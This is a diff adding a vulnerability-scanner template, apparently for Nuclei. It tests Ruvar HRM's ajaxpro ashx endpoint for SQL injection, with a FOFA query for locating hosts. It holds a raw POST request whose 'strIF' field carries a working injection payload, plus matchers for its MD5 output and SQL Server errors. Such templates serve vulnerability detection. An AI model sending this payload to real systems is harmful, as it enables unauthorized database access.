@@ -1,0 +1,38 @@
+id: poc-yaml-ruvar-hrm-ruvarhrm-web-common-ashx-sqli
+info:
+  name: Ruvar HRM RuvarHRM.Web.Common.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: ruvar_hrm
+    fofa-query: body="RuvarHRM/web_login/login.aspx"
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Ajaxpro-Method: SearchUsers
+
+        {"strIF":"1=1) and 1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--","deptPv":"0","strUserType":"all"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "System.Data.SqlClient.SqlException"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
